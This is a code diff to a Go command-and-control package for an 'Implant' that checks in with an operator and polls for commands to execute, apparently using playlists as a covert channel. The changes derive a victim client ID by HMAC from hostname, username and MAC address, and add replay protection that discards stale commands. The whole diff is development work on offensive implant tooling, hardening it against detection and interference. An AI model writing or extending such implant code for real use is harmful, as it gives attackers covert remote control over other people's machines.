@@ -2,10 +2,13 @@ package c2
 
 import (
 	"context"
+	"crypto/hmac"
 	crand "crypto/rand"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"hash/adler32"
+	"math"
 	"math/rand"
 	"net"
 	"os"
@@ -84,8 +87,9 @@ func getClientID(encryptionKey string) string {
 		}
 	}
 
-	seed := encryptionKey + "|" + hostname + "|" + username + "|" + mac
-	return fmt.Sprintf("%08x", adler32.Checksum([]byte(seed)))
+	h := hmac.New(sha256.New, []byte(encryptionKey))
+	h.Write([]byte(hostname + "|" + username + "|" + mac))
+	return hex.EncodeToString(h.Sum(nil))[:16]
 }
 
 // sendCheckin sends a check-in beacon so the operator knows we connected.
@@ -330,6 +334,15 @@ func (imp *Implant) pollAndExecute() {
 		}
 
 		msg := protocol.FromCommandMap(cmdDict)
+
+		// Validate timestamp — reject stale commands (replay protection)
+		age := math.Abs(float64(time.Now().Unix()) - msg.Ts)
+		if age > 300 {
+			fmt.Printf("[!] Stale command rejected (seq=%d, age=%.0fs)\n", seqNum, age)
+			_ = imp.client.CleanC2Playlists(ctx,
+				protocol.ChannelCmd, imp.key, seqNum)
+			continue
+		}
 
 		// Validate session ID — reject commands from stale sessions
 		if msg.SessionID != "" && msg.SessionID != imp.sessionID {
